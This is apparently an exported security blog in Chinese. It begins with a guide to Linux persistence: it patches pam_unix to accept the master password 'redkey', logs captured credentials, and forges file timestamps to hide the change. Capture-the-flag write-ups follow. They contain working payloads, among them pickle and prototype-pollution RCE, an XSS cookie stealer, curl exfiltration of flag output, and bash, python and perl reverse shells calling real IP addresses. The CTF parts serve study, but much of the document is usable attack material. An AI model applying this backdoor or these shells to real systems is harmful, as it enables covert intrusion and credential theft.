WR 9、PAM后门PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。 利用方法: 12341、获取目标系统所使用的PAM版本，下载对应版本的pam版本2、解压缩，修改pam_unix_auth.c文件，添加万能密码3、编译安装PAM4、编译完后的文件在：modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so，复制到&#x2F;lib64&#x2F;security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。 1rpm -qa | grep pam http://www.linux-pam.org/library/ 1234tar -xvf Linux-PAM-1.1.8.tar.gzcd Linux-PAM-1.1.8cd modules&#x2F;pam_unix&#x2F;vi pam_unix_auth.c 106行添加FILE *fp; 在177行添加 12345678910111213141516&#x2F;*password:&quot;redkey&quot;*&#x2F;if(strcmp(p,&quot;redkey&quot;)&#x3D;&#x3D;0)&#123; retval &#x3D; PAM_SUCCESS;&#125;if(retval&#x3D;&#x3D; PAM_SUCCESS)&#123;&#x2F;*pamfile:pamwd.txt*&#x2F; fp&#x3D;fopen(&quot;pamwd.txt&quot;,&quot;a&quot;); fprintf(fp,&quot;%s::%s\\n&quot;,name,p); fclose(fp);&#125; name &#x3D; p &#x3D; NULL; AUTH_RETURN;&#125; 编译 123cd ..&#x2F;..&#x2F;.&#x2F;configuremake 会根据不同情况调用pam_unix.so 备份原有PAM模块 12find &#x2F; -name pam_unix.so&#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.so 12cd &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_unix.somv pam_unix.so&#123;,.bak&#125; 复制新PAM模块到/usr/lib64/security/目录下： 1cp &#x2F;root&#x2F;Linux-PAM-1.1.8&#x2F;modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so &#x2F;usr&#x2F;lib64&#x2F;security&#x2F; 修改pam模块时间属性 1touch -t 201804111122 pam_unix.so 前面都没问题，但是最后连接不上。。。 排查技巧 1234567# 1、通过Strace跟踪sshps axu | grep sshdstrace -o aa -ff -p PIDgrep open aa* | grep -v -e No -e null -e denied| grep WR# 2、检查pam_unix.so的修改时间stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so #32位stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so #64位 10、rookit后门 Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。 利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。 我本地测试了下，直接报错了， 64位系统中安装了32位程序解决办法 是因为64位系统中安装了32位程序 解决方法： 代码如下 复制代码 yum install glibc.i686 问题二，解决交叉编译环境错误 # 1yum install glibc.i686 centos6起/etc/syslog.conf不再有！而是/etc/rsyslog.conf代替！ 仍然有几个错误无法解决，但是网上流传的大多是这个版本。。 关于rookit需要继续探索。 参考链接 https://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=2448904990&amp;idx=1&amp;sn=9d5ed78f2d760540e4a40e5e9bb29048&amp;chksm=8b55c343bc224a55998647ff96c8e96a81fa128f2d32c6d95e0e83e1cde1a5b996612b52333a&amp;scene=126&amp;sessionid=1583909254&amp;key=8eee0b50946f7fa18c094b8a6874c7b06957421cd93368879b6f05c195994e2fd058437935c4fc42c9c748d7f973843bc7ac101fc59b6016f6d14860397b7d6d10e0dd011612fd7cb274951496f98813&amp;ascene=1&amp;uin=NzY4MzU5NDcy&amp;devicetype=Windows+10&amp;version=62080074&amp;lang=zh_CN&amp;exportkey=AR76JlF7ukKA%2B%2FrHmZNLPg4%3D&amp;pass_ticket=DQ6PMsSqx8syDl1t9nL1Y2s5T9VMq8kFaoEXTwcSMOZoXARa3QjAHcL6ZTfCpZ63 https://blog.51cto.com/huangzp/1911767 https://www.cnblogs.com/beautiful-code/p/9441757.html","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://glotozz.github.io/tags/Linux/"}]},{"title":"XCTF高校战“疫”网络安全分享赛","slug":"高校战“疫”网络安全分享赛","date":"2020-03-08T12:02:35.000Z","updated":"2020-04-19T08:25:15.694Z","comments":true,"path":"2020/03/08/高校战“疫”网络安全分享赛/","link":"","permalink":"https://glotozz.github.io/2020/03/08/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 sqlcheckin webtmp fmkq nweb UAF-PHP webct easy_trick_gzmtu hackme GuessGame NothardWeb dooog baby_java happyvacation hardphp easyweb 总结： 参考链接 sqlcheckin代码没有进行转义，过滤了很多，下面的万能密码可以 1234admin&#39;-0-&#39;1&#39;-&#39;1&#39;&amp;&#39;1 除了开头是非零数的字符串，其他字符串化成整数都为0，字符串=0为真，当所有username里没有开头是0的字符串，username=0相当于查全部数据 webtmp过滤了R 从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 一开始考虑RCE 1b&#39;\\x80\\x03c__main__\\nAnimal\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls &#x2F;\\nb0c__main__\\nAnimal\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameq\\x03X\\x14\\x00\\x00\\x00\\xe4\\xb8\\x80\\xe7\\xbb\\x99\\xe6\\x88\\x91\\xe5\\x93\\xa9giaogiaoq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x04\\x00\\x00\\x00Giaoq\\x06ub.&#39; 提示global XX，应该是因为raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))，后来考虑改写secret对象 secret.py 1secret &#x3D; &#123;&#39;name&#39;:&#39;xx&#39;,&#39;category&#39;:&#39;yy&#39;&#125; exp.py 12345678910import pickleimport pickletoolsimport secretclass Animal: def __init__(self): self.name = 'aa' self.category = 'bb's = b'\\x80\\x03c__main__\\nsecret\\n&#125;(Vname\\nVaa\\nVcategory\\nVbb\\nub0c__main__\\nAnimal\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00aaX\\x08\\x00\\x00\\x00categoryX\\x02\\x00\\x00\\x00bbub.'l = pickle.loads(s)pickletools.dis(s) base64编码即可 fmkq绕过head： \\ 绕过format： %1$s 8080端口api，考虑ssrf 尝试了各种payload： 1127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#x2F;tmp&#x2F;..&#x2F;*&#x2F;flag%26vipcode&#x3D;0 最后队里一个师傅搞到了vipcode {file.vip.__dict__} 之后虽然找到了flag路径，但是提示nonono，需要读取源码 /app/app.py 1234567891011121314151617181920212223242526272829303132333435363738import webfrom urllib.parse import unquotefrom base.readfile import *urls = ( '/', 'help', '/read/(.*)','read')web.config.debug = Falseclass help: def GET(self): help_information = ''' Welcome to our FMKQ api, you could use the help information below To read file: /read/file=example&amp;vipcode=example if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125; Other functions only for the vip!!! ''' return help_informationclass read: def GET(self,text): file2read = readfile(text) if file2read.test() == False: return \"error\" else: if file2read.isvip() == False: return (\"The content of \"+ file2read.GetFileName() +\" is &#123;file&#125;\").format(file=file2read) else: vipfile2read = vipreadfile(file2read) return (str(vipfile2read))if __name__ == \"__main__\": app = web.application(urls, globals()) app.run() /app/base/vip.py就是验证码的 /app/base/readfile.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from .vip import vipimport reimport osclass File: def __init__(self,file): self.file = file def __str__(self): return self.file def GetName(self): return self.fileclass readfile(): def __str__(self): filename = self.GetFileName() if '..' in filename or 'proc' in filename: return \"quanbumuda\" else: try: file = open(\"/tmp/\" + filename, 'r') content = file.read() file.close() return content except: return \"error\" def __init__(self, data): if re.match(r'file=.*?&amp;vipcode=.*?',data) != None: data = data.split('&amp;') data = &#123; data[0].split('=')[0]: data[0].split('=')[1], data[1].split('=')[0]: data[1].split('=')[1] &#125; if 'file' in data.keys(): self.file = File(data['file']) if 'vipcode' in data.keys(): self.vipcode = data['vipcode'] self.vip = vip() def test(self): if 'file' not in dir(self) or 'vipcode' not in dir(self) or 'vip' not in dir(self): return False else: return True def isvip(self): if self.vipcode == self.vip.GetCode(): return True else: return False def GetFileName(self): return self.file.GetName()current_folder_file = []class vipreadfile(): def __init__(self,readfile): self.filename = readfile.GetFileName() self.path = os.path.dirname(os.path.abspath(self.filename)) self.file = File(os.path.basename(os.path.abspath(self.filename))) global current_folder_file try: current_folder_file = os.listdir(self.path) except: current_folder_file = current_folder_file def __str__(self): if 'fl4g' in self.path: return 'nonono,this folder is a secret!!!' else: output = '''Welcome,dear vip! Here are what you want:\\r\\nThe file you read is:\\r\\n''' filepath = (self.path + '/&#123;vipfile&#125;').format(vipfile=self.file) output += filepath output += '\\r\\n\\r\\nThe content is:\\r\\n' try: f = open(filepath,'r') content = f.read() f.close() except: content = 'can\\'t read' output += content output += '\\r\\n\\r\\nOther files under the same folder:\\r\\n' output += ' '.join(current_folder_file) return output 需要绕过黑名单 12if &#39;fl4g&#39; in self.path: return &#39;nonono,this folder is a secret!!!&#39; 我们传入的是readfile 12345678def GetName(self): return self.filedef GetFileName(self): return self.file.GetName()self.filename = readfile.GetFileName()self.path = os.path.dirname(os.path.abspath(self.filename))filepath = (self.path + '/&#123;vipfile&#125;').format(vipfile=self.file) 分析下汪汪汪师傅的payload http://127.0.0.1:8080/read/file=/{vipfile.file[0]}l4g_1s_h3re_u_wi11_rua/flag 本地搭建下 123filepath &#x3D; (&#39;C:\\\\&#123;vipfile.file[0]&#125;l4g_1s_h3re_u_wi11_rua&#x2F;&#123;vipfile&#125;&#39;).format(vipfile&#x3D;self.file)&#x3D;&gt;filepath &#x3D; (&#39;C:\\\\fl4g_1s_h3re_u_wi11_rua&#39; + &#39;&#x2F;flag&#39;) format()是可以传入对象的，这里传入的self.file是file对象，file.file是{str}&#39;flag&#39;，因此vipfile.file[0]就是f，至于{vipfile}，就是def __str__(self):返回的字符串 最后举个简单的例子 ==================分割线 补充下前面ssti的探测过程，当时不知道为啥没测出来 1&#123;file.__class__&#125; 1&#123;file.__class__.__init__.__globals__&#125; 发现file下有个vip 1&#123;file.vip.class.init.globals&#125; nweb根据html提示110，修改type，成功注册 之后是sql注入，报500，猜测是替换为空，双写绕过，得到一半flag 提示Rogue-MySql-Server，给了账号密码，登录admin发现可以mysql恶意服务端读取 UAF-PHPPHP7.4，但是未开启FFI 1apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system 1open_basedir &#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp 用这个php7.0-7.4的exp https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php?tdsourcetag=s_pctim_aiomsg 沙箱有点问题，最后放tmp目录下再包含才成功 webct上传phar.gif，利用mysql服务端恶意读取文件触发phar:// 记录一个小坑，PHP的配置一般是常量，因此可以打印下从而解决直接传MYSQLI_OPT_LOCAL_INFILE传输后变字符串的问题 12345678&lt;?php $m = new mysqli('117.78.1.xxx','root','root'); if($m-&gt;connect_error)&#123; die($m-&gt;connect_error); &#125; var_dump(MYSQLI_OPT_LOCAL_INFILE); $m-&gt;options(MYSQLI_OPT_LOCAL_INFILE,1); $result=$m-&gt;query('select 1;'); option传8即可 easy_trick_gzmtu每个字母前添加\\即可，成功得到 url： /eGlhb2xldW5n username： admin password： 20200202goodluck 登录后存在文件读取，绕过本地 1url&#x3D;file:&#x2F;&#x2F;localhost&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php index.php 123456789&lt;?phpinclude('conn.php');error_reporting(0);$time = date($_GET['time']);$sql = \"select * from `content` where `createtime` = '$time' \";$r = $conn-&gt;query($sql);$content = $r-&gt;fetch_array(MYSQL_ASSOC);?&gt; https://www.php.net/manual/zh/function.date.php 在格式字串中的字符前加上反斜线来转义可以避免它被按照上表解释。 eGlhb2xldW5n/check.php 123456789101112131415161718&lt;?phpinclude(\"../conn.php\");if(empty($_SESSION['login']))&#123; die('请登录!');&#125;if(isset($_GET['url']))&#123;$url = $_GET['url'];$parts = parse_url($url);if(empty($parts['host']) || $parts['host'] != 'localhost') &#123; die('请从本地访问');&#125; if(!preg_match(\"/flag|fl|la|ag|fla|lag|log/is\", $parts['path']))&#123; readfile($url); &#125;else&#123; die('不要搞这些奇奇怪怪的东西。'); &#125;&#125; 这里是$parts = parse_url($url); https://www.php.net/manual/zh/function.parse-url.php /eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass trick&#123; public $gf; public function content_to_file($content)&#123; $passwd = $_GET['pass']; if(preg_match('/^[a-z]+\\.passwd$/m',$passwd)) &#123; if(strpos($passwd,\"20200202\"))&#123; echo file_get_contents(\"/\".$content); &#125; &#125; &#125; public function aiisc_to_chr($number)&#123; if(strlen($number)&gt;2)&#123; $str = \"\"; $number = str_split($number,2); foreach ($number as $num ) &#123; $str = $str .chr($num); &#125; return strtolower($str); &#125; return chr($number); &#125; public function calc()&#123; $gf=$this-&gt;gf; if(!preg_match('/[a-zA-z0-9]|\\&amp;|\\^|#|\\$|%/', $gf))&#123; eval('$content='.$gf.';'); $content = $this-&gt;aiisc_to_chr($content); return $content; &#125; &#125; public function __destruct()&#123; $this-&gt;content_to_file($this-&gt;calc()); &#125; &#125;unserialize((base64_decode($_GET['code'])));?&gt; 绕过正则用%0a，两位的限制，它最后有个tolowercase()，可以用大写绕过， 字母的过滤，利用取反操作 12345a = 'FLAG'res = ''for i in a: res += str(ord(i))print(res) 123456789101112&lt;?phpclass trick&#123; public $gf;&#125;$s = \"70766571\";$s = urlencode(~$s);$a = new trick();$a-&gt;gf = urldecode('~'.$s);echo base64_encode(serialize($a));//另一种写法//$a = new trick();//$a-&gt;gf = '~'.(~'70766571'); 1Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czo5OiJ+yM&#x2F;IycnKyM4iO30&#x3D; url编码下即可 =================================分割线 上面是做过的 =================================分割线 hackme session.serialize_handler误用导致的反序列化问题： https://www.cnblogs.com/sijidou/p/10455646.html 绕过代码中给出的限制参考bytectf原题：四字符写shell写shell后cat /flag 1compress.zlib:&#x2F;&#x2F;data:@127.0.0.1&#x2F;baidu.com?,ls GuessGame1234567if(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123; //res.end(flag); //Stop your wishful thinking and go away!&#125;if(req.query.q === flag) result+=flag;res.end(result); 原型链污染 1&#123;\"user\":&#123;\"username\":\"admın888\",\"__proto__\": &#123;\"enableReg\": True&#125;&#125;&#125;) 50行使用regExp来匹配flag，regExp可控，因此可以构造特殊表达式控制匹配时间 假设flag为：flag{klasdfjasfasdfadffsdfas} 构造var reg = /^flag{(((([a-zA-Z0-9]+)+)+)+)+1$/ 匹配的时间会相当长 再构造var reg = /^flag{a(((([a-zA-Z0-9]+)+)+)+)+1$/匹配时间会很短（匹配到k!=a会直接结束）因此可以通过匹配时间来判断flag，但是还没太想好 秘笈！手工盲注！ ====================分割线 emm自己本地搭了个 12345678910111213141516171819var express = require('express');var app = express();var flag = \"flag&#123;klasdfjasfasdfadffsdfas&#125;\";app.get('/', function (req, res) &#123; let regExp = req.query.q; console.log(regExp); console.log(flag); if(flag.match(regExp))&#123; &#125; res.send('ok');&#125;)var server = app.listen(8081, function () &#123; var host = server.address().address var port = server.address().port console.log(\"应用实例，访问地址为 http://%s:%s\", host, port)&#125;) 下面的payload测试成功 1^(?&#x3D;xx)(.*)*aaaaa$ &#x2F;&#x2F;xxx匹配上会延时，并且结尾不能是aaaaa =================分割线 看了vn的wp，直接rce，当时也有点疑问，被污染的参数明明会触发，为啥不能rce。。。 v&amp;n的脚本 123456789101112import requeststheips = [\"http://121.37.179.47:8081/\",\"http://121.37.167.12:80\",\"http://121.37.167.12:81\",\"http://121.37.167.12:82\"]proxies=&#123;\"http\":\"http://localhost:4476\"&#125;while 1: for i in theips: try: requests.post(i,json=&#123;\"user\":&#123;\"username\":\"admIn888\",\"__proto__\":&#123;\"enableReg\":True,\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc 106.14.15.50 1234 &gt; /tmp/fa ');var __tmp2\"&#125;&#125;&#125;,timeout=1,proxies=proxies) requests.get(i,timeout=1,proxies=proxies) except: pass NothardWebcbc字节翻转攻击，对于已知明文和密文，即可构造我们需要的明文对应的密文 分析明文和密文，因为是明文最后需要反序列化，因此cbc字节翻转攻击需要iv，思路是利用cbc选择密文攻击得到iv，但是好像又不行，似乎需要控制任意明文才行 ================分割线 因为key生成的方式strval(mt_rand() &amp; 0x5f5e0ff)， 0x5f5e0ff = 0b101111101011110000011111111，19个1有54w多种情况，带入解码如果正确解码说明key是正确的 de1ta的脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?php$cccc=\"%d0%d%d%d%d%d0%d0%d%d%d%d00000%d%d%d%d%d%d%d%d\";for ($a=0; $a &lt; 2; $a++) &#123; for ($b=0; $b &lt; 2; $b++) &#123; for ($c=0; $c &lt; 2; $c++) &#123; for ($d=0; $d &lt; 2; $d++) &#123; for ($e=0; $e &lt; 2; $e++) &#123; for ($f=0; $f &lt; 2; $f++) &#123; for ($g=0; $g &lt; 2; $g++) &#123; for ($h=0; $h &lt; 2; $h++) &#123; for ($i=0; $i &lt; 2; $i++) &#123; for ($j=0; $j &lt; 2; $j++) &#123; for ($k=0; $k &lt; 2; $k++) &#123; for ($l=0; $l &lt; 2; $l++) &#123; for ($m=0; $m &lt; 2; $m++) &#123; for ($n=0; $n &lt; 2; $n++) &#123; for ($o=0; $o &lt; 2; $o++) &#123; for ($p=0; $p &lt; 2; $p++) &#123; for ($q=0; $q &lt; 2; $q++) &#123; for ($r=0; $r &lt; 2; $r++) &#123; for ($s=0; $s &lt; 2; $s++) &#123; $f_key=sprintf($cccc,$a,$b,$c,$d,$e,$f,$g,$h,$i,$j,$k,$l,$m,$n,$o,$p,$q,$r,$s); $key=base_convert($f_key,2,10); $result=decode_aes($key); if(stripos($result,\"guest\"))&#123; echo $result; echo $key.\"\\n\"; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125;function decode_aes($key)&#123; $ch=base64_decode(\"NGtWc0JCQ080dkNxcnhtVjVOSG1rQ3hWckRab3pjWkllTmdJMmovclR4YktzNk9FTERBSnYxSUNKVmQ4Qk55Qg==\"); $de = openssl_decrypt($ch,\"des-cbc\",$key,0,\"abcdabcd\"); return $de;&#125;?&gt; 遍历得到的key异或还原出iv，然后再和hash比较，找出正确的iv 12345678&lt;?php$key = strval(94675148);//每次会变$p = openssl_decrypt($cipher, 'des-cbc', $key, 0, $iv);print_r($p.\"&lt;br/&gt;\");$iv = \"\";for ($i = 0; $i &lt; 8; $i++) &#123;·//还原iv就是和密文和第一组明文进行异或 $iv .= chr(ord($p[$i]) ^ ord($plain[$i]));&#125; 非预期：但是因为这里的iv和key是保存在session中，shana师傅直接删除sessionid，那么就都为空了 1$sessionUser &#x3D; base64_encode(openssl_encrypt($user, &#39;des-cbc&#39;, &#39;&#39;, 0, &#39;&#39;)); 之后是个tomcat的PUT方法传shell的漏洞，传个ew代理 =========================分割线 vp的wp还有另一种思路 浏览题目，初步分析此处为 mt_rand 特性，第一次访问时可以拿到 第一次，第 227，228 次生成的随机数，爆破随机数种子之后可以得到 第 229 个随机数，得到密钥。 dooogcmd有很明显的逻辑漏洞，可以绕过对cmd的判断 1234if int(time.time()) - data[&#39;timestamp&#39;] &lt; 60: if cmd not in [&#39;whoami&#39;, &#39;ls&#39;]: return &#39;cmd error&#39;... 简单分析下源码 在/getTGT中，用(username + &#39;|&#39; + session_key + &#39;|&#39; + str(int(time.time())))生成TGT的KEY我们不知道，但是知道加密结果TGT，用session_key生成session_key_enc的KEY我们是我们可控的master_key， 在/getTicket中， 123cryptor &#x3D; AESCipher(app.config.get(&#39;SECRET_KEY&#39;))auth_data &#x3D; cryptor.decrypt(base64.b64decode(TGT)).split(&#39;|&#39;)cryptor &#x3D; AESCipher(auth_data[1]) 发现生成authenticator的KEY就是session_key，之后session_key2生成client_message的KEY也是session_key，生成server_message的KEY是master_key 最后， 1234client_message, server_message &#x3D; res.content.split(&#39;|&#39;)session_key &#x3D; cryptor.decrypt(base64.b64decode(client_message))cryptor &#x3D; AESCipher(session_key)authenticator &#x3D; base64.b64encode(cryptor.encrypt(username)) 对authenticator进行加密的KEY是session_key2。 然后就可以写脚本了。抄一下作业 12345678910111213141516171819202122232425from toolkit import AESCipherimport osimport requestsimport jsonimport timeimport base64import requestscryptor = AESCipher('00000000')authenticator = cryptor.encrypt(json.dumps(&#123;'username':'Q7','timestamp':int(time.time())&#125;))au = base64.b64encode(authenticator)print autgt = requests.post('http://121.37.164.32:5001/getTGT',data=&#123;'username':'Q7','authenticator': au&#125;).contentprint tgtsession_key, tgt = cryptor.decrypt(base64.b64decode(tgt.split('|')[0])), tgt.split('|')[1]cryptor = AESCipher(session_key)authenticator = base64.b64encode(cryptor.encrypt(json.dumps(&#123;'username': 'Q7','timestamp': int(time.time())-100&#125;)))res = requests.post('http://121.37.164.32:5001/getTicket', data=&#123;'username': 'Q7', 'authenticator': authenticator, 'TGT':tgt, 'cmd': '''curl q71998.cn:2333 -d `/readflag` '''&#125;).contentprint resclient_message, server_message = res.split('|')session_key = cryptor.decrypt(base64.b64decode(client_message))cryptor = AESCipher(session_key)authenticator = base64.b64encode(cryptor.encrypt(\"Q7\"))res = requests.post('http://121.37.164.32:5002/cmd',data=&#123;'server_message': server_message, 'authenticator':authenticator&#125;).contentprint res baby_javaxxe读取hint.txt 依赖里有fastjson，版本为1.2.48。。。 而prefix是想考fastjson会自动处理 - 和_ 的特性，在fastjson中， parseField 这个函数里会去掉字符串中的 - 和开头的下划线，因此带个 - 就可以了 happyvacation还没看题就被队友秒了🤦‍♂️， 有个非预期，利用下面的将上传黑名单置为false，从而上传任意后缀文件 1eval(&quot;\\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;); 控制header头，设置为gbk，可以利用宽字节使单引号逃逸。从而xsshttp://159.138.4.209:1002/quiz.php?referer=Content-Type: text/html; charset=GBK; Referer: index&amp;answer=user-&gt;url-&gt;pre payload: 1&#96;1%aa&#39;;var d&#x3D;String.fromCharCode(100,111,99,117,109,101,110,116);var c &#x3D;String.fromCharCode(99,111,111,107,105,101);var w&#x3D;String.fromCharCode(119,105,110,100,111,119);var o&#x3D;String.fromCharCode(111,112,101,110);var ip &#x3D; String.fromCharCode(47,47,52,55,46,50,52,48,46,52,56,46,52,50,58,50,51,51,51,47);self[w].open(ip%2bself[d][c]);&#x2F;&#x2F;&#96; hardphp第一步去混淆。 easyweb用下面的包能读取文件，wp没解释。。。 1234567891011121314151617POST &#x2F;createmd?operate&#x3D;file&amp;isConvert&#x3D;true HTTP&#x2F;1.1Host: 121.36.222.22:801User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;62.0.3202.9 Safari&#x2F;537.36Accept: *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3Accept-Encoding: gzip, deflateContent-Type: text&#x2F;plainReferer: http:&#x2F;&#x2F;121.36.222.22:801&#x2F;profile.jspContent-Length: 39Cookie: JSESSIONID&#x3D;A33FFBFC70E5BF80F9D1E212F7C6402C;session_id&#x3D;7b0e89e7d9943a4581d96c705d3084537b12fceeX-Forwarded-For: 127.0.0.1Connection: close![](http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;profile.jsp) start.sh 再看到 /home/tomcat/webapps/ROOT/WEB-INF/libs/ 下 Common Collections 为 3.1，有漏洞。 再根据题目提示的端口 2078, 然后就可以在本地构造一个 RMI 客户端，调用上面这个方法，实施反序列化。 总结：做题还是得想想考点是啥，不要一味死磕。 短板还是辣么多。 nepnep的师傅们tql👅 参考链接 https://wx.zsxq.com/dweb2/index/group/824215518412 https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247484827&amp;idx=1&amp;sn=08a52b82dd04c37c17c08bcc85dc42de&amp;chksm=fd7110d6ca0699c02196923e2e95f77fbe5048dd023eba473fc391d7f97afde9f0bb7a6cdd93&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1583814055793&amp;sharer_shareid=0ed84c079a78a485e04fa50e826c0770#rd https://blog.de1ta.club/2020/03/10/XCTF%3CZHANYI%3E-2020/?nsukey=IRbrIReu2wgWelMKXIRg4GOxeF%2BLe8ryMZZza8bY%2B5UgrdvTaFVYAQQuqITVkIY%2F3qZZr53BXziZp0BnYjDfHN9KclyHbOpnuX%2F58pz3L1BhHsLZFkkkuhPAe67XBCpceGlpKo05X3R29J7qpnPi7I0QG7Vfn%2Fyrs2SCrbWEs%2F7mJImS4VdDc%2BLdt4vxOsgUV81pEMEh0mC5qAkz7Y92uA%3D%3D&amp;scene=2&amp;clicktime=1583836967&amp;enterid=1583836967&amp;from=timeline&amp;isappinstalled=0 https://mp.weixin.qq.com/s/RjTsvUsx65YTMIg3jejXng","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"V&N2020公开赛wp","slug":"V-N2020公开赛wp","date":"2020-03-02T14:06:02.000Z","updated":"2020-03-25T08:04:45.393Z","comments":true,"path":"2020/03/02/V-N2020公开赛wp/","link":"","permalink":"https://glotozz.github.io/2020/03/02/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9Bwp/","excerpt":"前两天没打，补一补🤦‍♂️","text":"前两天没打，补一补🤦‍♂️ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 Happy-CTFd CHECKIN TimeTravel EasySpringMVC 参考链接 Happy-CTFdCTFd前些天出的漏洞，注册用户时判断用户是否存在的时候没有对两端空格进行处理，而插入数据库的时候去除了两端的空格。开个隐私窗口为新帐户启动密码重置，生成的token链接中对应了admin账户，我们先修改用户名为其他，再去邮箱重置admin帐户的密码。 CHECKIN123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp &#x3D; Flask(__name__)flag_file &#x3D; open(&quot;flag.txt&quot;, &quot;r&quot;)# flag &#x3D; flag_file.read()# flag_file.close()## @app.route(&#39;&#x2F;flag&#39;)# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route(&#39;&#x2F;shell&#39;)def shell(): os.system(&quot;rm -f flag.txt&quot;) exec_cmd &#x3D; request.args.get(&#39;c&#39;) os.system(exec_cmd) return &quot;1&quot;@app.route(&#39;&#x2F;&#39;)def source(): return open(&quot;app.py&quot;,&quot;r&quot;).read()if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0.0&#39;) emmm，其实就考了一个知识点 在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。 类似的还有/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录 如果有回显，直接cat /proc/*/fd/*即可，但是本题没有回显，需要反弹shell，这里提供3中反弹方式 1echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3NC4wLjIyMi4yMDMvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash 1python3 -c &#39;mport socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.222.203&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&quot;&#x2F;bin&#x2F;sh&quot;,&quot;&quot;-i&quot;]);&#39; 1perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;174.0.222.203:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; TimeTravel12345678910111213141516171819202122232425 &lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) &#123; $client = new Client(); $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible'); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) &#123; echo system('/readflag'); &#125;&#125;if(isset($_GET['file'])) &#123; 